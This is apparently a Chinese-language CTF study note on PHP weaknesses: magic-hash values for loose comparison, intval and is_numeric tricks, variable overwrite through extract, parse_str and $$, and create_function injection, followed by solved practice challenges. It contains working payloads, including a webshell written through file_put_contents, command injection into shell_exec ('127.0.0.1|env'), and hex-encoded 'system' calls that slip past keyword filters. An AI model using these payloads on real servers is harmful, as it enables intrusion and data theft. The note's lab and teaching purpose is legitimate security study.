## php特性
#### MD5/sha1碰撞：
```
*MD5*
QNKCDZO
0e830400451993494058024219903391
s878926199a
0e545993274517709034328855841020
s155964671a
0e342768416822451524974117254469
s214587387a
0e848240448830537924465865611904
s878926199a
0e545993274517709034328855841020
*sha1*
10932435112(如果sha1要用纯数字)
0e07766915004133176347055865026311692244
aaroZmOk
0e66507019969427134894567494305185566735
aaK1STfY
0e76658526655756207688271159624026011393
aaO8zKZF
0e89257456677279068558073954252716165668
0e1290633704
0e19985187802402577070739524195726831799
```
这些值MD5/sha1后是以0e开头，并且之后全是数字，如果题目是弱比较的话`==`,那么比较是就会识别为科学计数法，即0的多少次方都为0，所以即使原字符串不相等，但MD5/sha1后弱比较相等
还有一些
```
179122048:0e983430692806892134340492059275
421525751:0e834768210109958574832452736235
1211652537:0e090027328700692465761565258383
1592125112:0e308151927959534270733241377880
gu0xv1:0e338203353355022633220319455574
hgccx3:0e742678484972759051041417502882
lnv58l:0e439614020547377844163917336577
proc4j:0e754530718103069477413069963316
sjvc4k:0e626098545524870319244147855657
t691su:0e187100874051574238974154872130
toa2n2:0e302797656033408803640872127221
wz7dfi:0e433664027184683593761088294641
z9olxs:0e318067447282591068759217444431
14ipx54:0e925104579590390905045925705563
19p3nee:0e306660290160667956850458908080
4n3e03j:0e962134233575698536944176647873
4ox97l6:0e352497154582367607177736910299
anazgoh:00e51824645973564823387321423930
6x4yeko:0e616838313913860932621103053415
19y4ovcf:0e105229687867237222681361485869
HwXXJLc8lm:0e069133985473368679689505887635
```
这些是二次加密后是0e开头数字在后的

#### 函数
- `preg_match('/PHP/', $str)`检查$str中是否有PHP,匹配成功返回 **1**，匹配失败返回 **0**，发生错误返回 **false**。不仅可以匹配字符，还可以匹配各种符号
- `intval($var, $base)`，函数若$base=0,intval会自动识别数字进制，以0x开头为十六进制，以0开头（非0x）,识别为八进制，以数字1-9开头识别为十进制，也会识别科学计数法,当 $base不填时则强制转换为十进制,如果 ` $base`不填时有一些特性，如`123a`弱比较解析为`123`,如果字母开头解析为0,还有`057`是八进制数，但他会强制解析为十进制数57,可以实现一些特殊的绕过
- `strpos($file, '..')` 用于查找 `'..'` 在 `$file` 中首次出现的位置。如果找到，返回对应的索引值（整数）；如果没找到，返回 `false`。常用于过滤某种字符或字符串
- `ereg()`其功能与 `preg_match` 类似，但存在一些关键差异。`ereg` 的模式**不需要分隔符**（如 `/`），直接写正则内容即可；而 `preg_match` 必须用分隔符包裹。`ereg` 仅支持**POSIX 基本正则表达式**，不支持 Perl 风格的扩展语法（如 `\d` 表示数字、`\w` 表示单词字符等），需用 `[0-9]` 代替 `\d`，`[a-zA-Z0-9_]` 代替 `\w`。`ereg` 默认大小写敏感，若需忽略大小写，需使用 `eregi`；而 `preg_match` 可通过修饰符 `i` 实现。
- `is_number()`检查变量是否为**数字**或**可被解释为数字的字符串**（包括整数、浮点数、科学计数法表示的字符串等）。如果是数字或数字字符串，返回 `true`；否则返回 `false`。用来过滤非数字，如`123a` ,如果对输入的字长有限制，可以用科学计数法压缩字长，如`1000000`可以写成`1e6`,长度压缩为三，但依然可以被`is_number()`识别为数字
- `ctype_space()` 是 PHP 中用于判断字符串是否仅包含**空白字符**的内置函数，检查输入字符串是否由空白字符组成，包括空格、制表符、换行符等，空字符串返回 `false`。全为空白字符返回 `true`，否则返回 `false`。若传入非字符串（如整数、数组），会先尝试转换为字符串。例如 `ctype_space(0)` 会转为字符串 `"0"`，返回 `false`。
- `trim()` 是 PHP 中用于移除字符串**首尾空白字符（或指定字符）** 的内置函数，支持自定义需要移除的字符集。如`trim($str, "#");`移除首尾的空白字符，默认不填的话，一处空白字符
- `file_get_contents()` 函数，它是 PHP 中用于读取文件内容（或网络资源）的常用函数，能将整个文件内容一次性读入字符串,如`$content = file_get_contents('./test.txt');`读取本地文件，`$html = file_get_contents('https://example.com');`读取网页内容（需开启 allow_url_fopen 配置）,`$content = file_get_contents('./data.txt', false, null, 5, 10);`从第 5 个字节开始，读取 10 个字节（仅本地文件有效）,如果为负数，则是从后往前读
- `preg_replace('/AND/i',"", $id);`将参数$id里的AND不区分大小写的替换为空，也就是直接删了。
- `strchr()` 是 PHP 中的一个字符串处理函数，用于查找字符串在另一个字符串中首次出现的位置，并返回从该位置到字符串结尾的子串（包括匹配的字符）。若 `$needle` 未在 `$haystack` 中找到，返回 `false`。
- `call_user_func($func, $param)` / `call_user_func_array()`- 漏洞场景：函数调用注入。若 `$func` 可控，可调用危险函数（如 `system`、`eval`）。 示例
 ```php
 call_user_func($_GET['func'], $_GET['param']);    // 利用：?func=system&param=cat /flag
 ```
- `file_get_contents($filename)` / `file_put_contents($filename, $data)` 漏洞场景：任意文件读取 / 写入。若 `$filename` 或 `$data` 可控，可读取服务器文件（如 `/flag`）或写入 webshell。- 示例：
 ```php
 // 读取漏洞：?file=/flag   
 echo file_get_contents($_GET['file']);  
 // 写入漏洞：?data=<?php eval($_POST['cmd']);?>   
 file_put_contents('shell.php', $_GET['data']);
 ```
- **`chr()`**：通过 ASCII 码拼接字符绕过关键字过滤（如 `chr(115).chr(121).chr(115).chr(116).chr(101).chr(109)` 拼接 `system`）。
- `stripos( <content>, '<?')`：在文件内容中查找 `'<?'` 子串（PHP 开始标签），`stripos` 是大小写不敏感的查找，返回 **位置（0-based）** 或 `false`。
#### 变量覆盖
**foreach函数**:会自动从第一个元素遍历到最后一个，支持所有数组，`$value` 是元素值的 “副本”，修改 `$value` 不会影响原数组
```php
foreach($array as $value){
// 循环体：$value 依次代表数组中的每个元素值
}
```

```php
foreach($array as $key=> $value){
//同时遍历键名和值
}
```

```php
<?php
$colors=["red","green","blue","yellow","purple","orange","pink","brown","gray","black","white"];
foreach($colors as $color){
    echo $color." ";
}
```
输出`red green blue yellow purple orange pink brown gray black white`
```php
<?php
$users=["name"=>"张三","age"=>25,"sex"=>"男"];
foreach($users as $key=>$value){
    echo $key.":".$value." ";
}
```
输出`name:张三 age:25 sex:男`
`$$`是 PHP 的 “可变变量” 语法，即一个变量的变量名由另一个变量的值决定
```php
$a="b";
$$a=123;
//等价于
$b=123;
```
若外层变量（如 `$a`）的值来自用户输入（且未过滤），攻击者可通过控制输入值，将值设为目标变量名，从而覆盖该变量
```php
$key=$_GET['key'];
$user="ghuset";
$$key="admin";
```
如果传入`?key=user`,即`user=admin`可能绕过权限验证
**extract()**:函数用于将数组中的键值对 “导入” 为当前作用域的变量（键名为变量名，值为变量值）`extract($array, $flags, $prefix);`默认情况下（`$flags` 为 `EXTR_OVERWRITE`），若数组中的键名与当前作用域已有的变量名相同，`extract()` 会直接覆盖原有变量。若数组数据来自用户输入（如 `$_GET`、`$_POST`），攻击者可通过构造数组键名，覆盖程序中的关键变量。
```php
$is_admin = false; // 程序原变量（控制管理员权限）
// 假设 $data 来自用户提交的表单（如 $_POST）
$data = $_POST; 
extract($data); // 将 $data 中的键值对转为变量
// 若攻击者提交表单数据：is_admin=true
// 则 $is_admin 会被覆盖为 true，导致权限绕过
if ($is_admin) {
    echo '管理员操作';
}
```
**parse_str()** 函数用于将查询字符串（如 URL 中的 `a=1&b=2`）解析为变量，直接定义在当前作用域中
`parse_str($str, $arr); // 若指定 $arr，则变量存入数组；否则直接定义为全局变量`若省略第二个参数 `$arr`，且 `$str` 来自用户输入，攻击者可通过构造查询字符串中的键名，覆盖当前作用域的已有变量。
```php
$token = 'valid_token'; // 程序原变量（用于验证）
// 假设 $input 来自用户输入（如 URL 中的查询字符串）
$input = $_SERVER['QUERY_STRING']; 
parse_str($input); // 解析为变量，未指定第二个参数
// 若攻击者访问 URL：?token=fake_token
// 则 $token 会被覆盖为 'fake_token'，导致验证失效
if ($token === 'valid_token') {
    echo '验证通过';
}
```

#### 非法传参
参数名为：`$_REQUEST['mo chu.']`  
参数名中含有`空格`和`点`，可以看到当我们传入`?mo chu.=xxx`时，传入的参数名中点`.`和`空格`都被替换为了下划线`_`，这样的参数名确实无法传参，当`PHP版本小于8`时，如果参数中出现中括号`[`，中括号会被转换成下划线`_`，但是会出现转换错误导致接下来如果该参数名中还有`非法字符`并不会继续转换成下划线`_`，也就是说如果中括号`[`出现在前面，那么中括号`[`还是会被转换成下划线`_`，但是因为出错导致接下来的非法字符并不会被转换成下划线`_`，利用了如果传入的参数名出现了中括号`[`只替换一次的原理，使得传入的参数为：`mo_chu.7`，在PHP8中这种转换错误被修复了，传入的参数名中非法字符一律全部转换为了下划线
**匿名函数**:`create_function(string $args, string $code): string`,
```php
$add=create_function('$a,$b','return $a+$b')
echo $add(2,3);
```
代码注入：当调用 create_function('$a', 'return $a;') 时，内部等价于：`
`function lambda_1($a) { return $a; }`
如果
```php
// 用户输入未过滤，直接传入 create_function 的参数
$user_input = $_GET['input'];
$func = create_function('$x', 'return $x + ' . $user_input . ';');
$func(1);
```
传入`input=1;}phpinfo();/*`
实际会被解析为
```php
function lambda_xxx($x) {
    return $x + 1;
}
phpinfo(); /*;  // 注入的代码被执行
```
其中`}`闭合原函数，`/*`注释掉后续多余字符，导致`phpinfo()`被执行
若注入点在`$args`参数（函数参数列表），可通过闭合参数列表注入代码
```php
$user_input = $_GET['input'];
$func = create_function($user_input, 'return 1;');
```
传入`input=';}phpinfo();/*`，拼接后参数列表变为
生成函数被解析为
```php
function lambda_xxx('') {
}
phpinfo(); /*;  // 注入代码执行
```
`/*`或`//`注释掉后续内容
**超全局变量**:
- `$GLOBALS`:包含当前脚本中所有全局变量的引用，键名为变量名，值为变量的值
```php
$x = 10;
$y = 20;
function test() {
    echo $GLOBALS['x'] + $GLOBALS['y']; // 无需声明 global，直接访问全局变量
}
test(); // 输出：30
```
- `$_SERVER`:包含服务器和执行环境的信息，如请求头、路径、脚本位置等。
常用元素名
	- `$_SERVER['PHP_SELF']`：当前执行脚本的文件名（相对于当前路径）。
	- `$_SERVER['REQUEST_METHOD']`：请求方法（GET/POST 等）。
	- `$_SERVER['REMOTE_ADDR']`：客户端 IP 地址。
	- `$_SERVER['HTTP_USER_AGENT']`：客户端浏览器信息。
	- `$_SERVER['REQUEST_URI']`：当前请求的 URI（包含路径和查询参数）
- `$_GET`
```php
echo $_GET['name']; 
echo $_GET['version']; 
```
- `$_POST`
```php
echo $_POST['username']; // 获取表单中 name 为 username 的值
```
- `$_FILES`
获取通过 HTTP POST 方式上传的文件信息。
	 `$_FILES['file']['name']`：上传文件的原始名称。
	 `$_FILES['file']['type']`：文件的 MIME 类型
	 `$_FILES['file']['tmp_name']`：文件上传到服务器后的临时路径
	 `$_FILES['file']['error']`：上传错误码（`0` 表示成功）
	 `$_FILES['file']['size']`：文件大小（字节）。
- `$_COOKIE`：获取客户端发送的 Cookie 数据。
```php
echo $_COOKIE['user_id']; // 获取名为 user_id 的 Cookie 值
```
- `$_SESSION`：存储和访问当前用户的会话数据（需先通过 `session_start()` 启动会话）
```php
session_start(); // 启动会话
$_SESSION['username'] = 'admin'; // 存储会话数据
echo $_SESSION['username']; // 访问会话数据，输出：admin
```
- `$_REQUEST`：默认包含 `$_GET`、`$_POST`、`$_COOKIE` 的数据（具体包含哪些取决于 `php.ini` 中的 `request_order` 配置）。
- `$_ENV`：包含环境变量的信息，如服务器的环境变量（需 `php.ini` 中 `variables_order` 包含 `E` 才会被填充）
```php
echo $_ENV['PATH']; // 输出系统的 PATH 环境变量（视服务器配置而定）
```
#### 三元运算符
在 PHP 中，三元运算符是一种简洁的条件判断语法，用于根据一个条件的真假返回不同的值。它是 if-else 语句的简化形式，语法紧凑，适合简单的条件判断场景。
**基本语法**：
```php
条件表达式 ? 表达式1 : 表达式2;
```
**执行逻辑**：
-  如果条件为 **真（`true`）**，则返回 “表达式 1” 的值；
- 如果条件为 **假（`false`）**，则返回 “表达式 2” 的值。





## 练习
#### simple_php
```php
<?php  
show_source(__FILE__);  
include("config.php");  
$a=@$_GET['a'];  
$b=@$_GET['b'];  
if($a==0 and $a){  
    echo $flag1;  
}  
if(is_numeric($b)){  
    exit();  
}  
if($b>1234){  
    echo $flag2;  
}  
?>
```
利用php弱比较特性，传入`?a=0a&b=1235a`得到flag
## easyphp
`isset($a)`即 `$a` 已定义且不为 `null`,
intval($a) > 6000000,PHP 中，`intval()` 处理字符串时，会从左到右解析数字，遇到非数字字符则停止。例如：
- `intval('123abc')` 结果为 `123`。
- `intval('7e6')` 中，`7e6` 是科学计数法表示（等价于 `7000000`），`intval()` 会解析为 `7000000`。
`strlen($a) <= 3`$a` 作为字符串时的长度 ≤ 3
所以7e6符合
`'8b184b' === substr(md5($b),-6,6)`md5()函数接受一个字符串（若 `$b` 不是字符串，PHP 会自动转换为字符串，例如 `$b=123` 会转为 `"123"`）。返回一个 **32 位的十六进制字符串**（由 0-9、a-f 组成，固定长度 32 字符），用于唯一标识输入内容（哈希值的特性是 “输入不同则哈希值大概率不同”，但存在哈希碰撞可能).
`substr(string $string, int $offset, ?int $length = null)` 是 PHP 中用于**截取字符串片段**的函数，参数含义：
- `$string`：要截取的原始字符串（这里是 `md5($b)` 生成的 32 位哈希值）。
- `$offset`：截取的起始位置（关键！当 `$offset` 为**负数**时，表示从字符串的 “末尾” 开始计数，`-6` 即 “从末尾往前数第 6 个字符”）。
- `$length`：要截取的字符长度（这里是 `6`，表示从起始位置往后截取 6 个字符）。
可以写一个python脚本生成一个哈希值后六位是8b184b的字符串
```python
import hashlib  
num=0  
target="8b184b"  
for num in range(1000000):  
    md5_hash = hashlib.md5(str(num).encode()).hexdigest()  
    if md5_hash[-6:] == "8b184b":  
        print(f"{num}")
```
`$c=(array)json_decode(@$_GET['c']);`
**`@$_GET['c']`**：`@` 是 PHP 的错误抑制符，用于忽略当`c`参数不存在时（即未传递`c`）产生的 “未定义索引” 警告。
**`json_decode(...)`**：对`c`参数的值进行 JSON 解码。
 若`c`的值是有效的 JSON 字符串（如 `{"name":"test"}`），则返回对应的 PHP 对象（默认）或数组（需指定第二个参数为`true`）。
 若`c`的值不是有效 JSON，返回`null`。
 **`(array)json_decode(...)`**：将 JSON 解码的结果（可能是对象、数组或`null`）强制转换为 PHP 数组：
- 若解码结果是对象，转换后数组的键为对象的属性名值为属性值。
- 若解码结果是数组，转换后仍是原数组（无变化）。
- 若解码结果是`null`，转换后为空数组 `[]`。
`is_array($c)`$c 是一个数组
`$c["m"]` 的值**不是数字或数字字符串**（例如字符串 `'2023a'`、布尔值 `true` 等）。（`!is_numeric(@$c["m"])`）。
`$c["m"]` 的值**在松散比较下大于 2022**（`$c["m"] > 2022`）
PHP 中使用 `>` 进行松散比较时，会自动将非数字类型**隐式转换为数字**后再比较：
- 字符串：从左到右提取数字部分，遇到非数字字符则停止（如 `'2023a'` 转换为 `2023`，`'a2023'` 转换为 `0`）。
- 布尔值：`true` 转换为 `1`，`false` 转换为 `0`。
- 其他类型（如数组、对象）：通常转换为 `0` 或引发比较失败。
`$c["n"]` 的元素数量必须恰好是 2（`count($c["n"]) == 2`）
`$c["n"]` 的第 0 个元素（索引为 0）必须是数组（`is_array($c["n"][0])`）
```php
// 1. 在 $c["n"] 中搜索 "DGGJ"，返回其索引（键名）
 $d = array_search("DGGJ", $c["n"]); 
 // 2. 若没找到（$d 为 false），则输出 "no..." 并终止程序 
 $d === false?die("no..."):NULL; 
 // 3. 遍历 $c["n"] 的每个元素，若有元素直接等于 "DGGJ"，则输出 "no......" 并终止 
 foreach($c["n"] as $key=>$val){ $val==="DGGJ"?die("no......"):NULL; }
```
`array_search($needle, $haystack)` 在默认情况下是**松散比较**（`==`），而非严格比较（`===`）。这意味着：

如果 `$c["n"]` 中的某个元素与 `"DGGJ"` 松散相等（`==`），`array_search` 会认为找到并返回其索引；但严格比较（`===`）时不相等，从而绕过遍历检查。
- `["DGGJ"] == "DGGJ"`：PHP 中数组与字符串松散比较时，数组会被视为 `true`，而非空字符串也为 `true`，因此 `==` 成立（返回 `true`）。
- `["DGGJ"] === "DGGJ"`：严格比较时类型不同（数组 vs 字符串），不成立（返回 `false`）。
- array_search 判断的方式相当于比较,判断`$c["n"]`中是否存在字符串"DGGJ",如果我们设置为0 .那么这个函数就会类型比较,从而将字符串转化为数值。而字符串"DGGJ"中无数字,故转为0  .和我们的数组内容相同。返回true.
所以最终payloads是`?a=7e6&b=53724&c={"m":"2024a","n":[[],0]}`
## `[SWPUCTF 2021 新生赛]easy_md5`
```php
if ($name != $password && md5($name) == md5($password)){  
        echo $flag;
```
可以用数组绕过，get`?name[]=1` post`password[]=2`MD5函数无法解析数组，会返回null,`null==null`
## 覆盖
```php
<?php  
error_reporting(0);  
if (empty($_GET['id'])) {    show_source(__FILE__);  
    die();  
} else {  
    include 'flag.php';    $a = "www.baidu.com";    $result = "";    $id = $_GET['id'];  
    @parse_str($id); //可以令$id=a[0]=www.polarctf.com
    echo $a[0];  //这样会输出www.polarctf.com
    if ($a[0] == 'www.polarctf.com') {        $ip = $_GET['cmd'];        $result .= shell_exec('ping -c 2 ' . $a[0] . $ip); //shell_exec可以执行系统命令 
        if ($result) {  
            echo "<pre>{$result}</pre>";  
        }  
    } else {  
        exit('其实很简单！');  
    }  
}
```
payload:`?id=a[0]=www.polarctf.com&cmd=127.0.0.1|env`或者`?id=a[0]=www.polarctf.com&cmd=127.0.0.1;env`发现flag在环境变量里，但提交flag发现不对，不知道为啥，网页目录下有一个flag.php的文件，cat一下什么都没有，右键查看源码得到真正的flag
## cool
system被绕过了，可以用十六进制拼接`?a="\x73\x79\x73\x74\x65\x6d"("cat fl\ag.txt");`flag可以用转义字符,同理flag也可以用十六进制
`?a="\x73\x79\x73\x74\x65\x6d"("cat \x66\x6c\x61\x67.txt");`
也可以用拼接`?a=(sy.(st).em)("cat fl\ag.txt");`得到flag




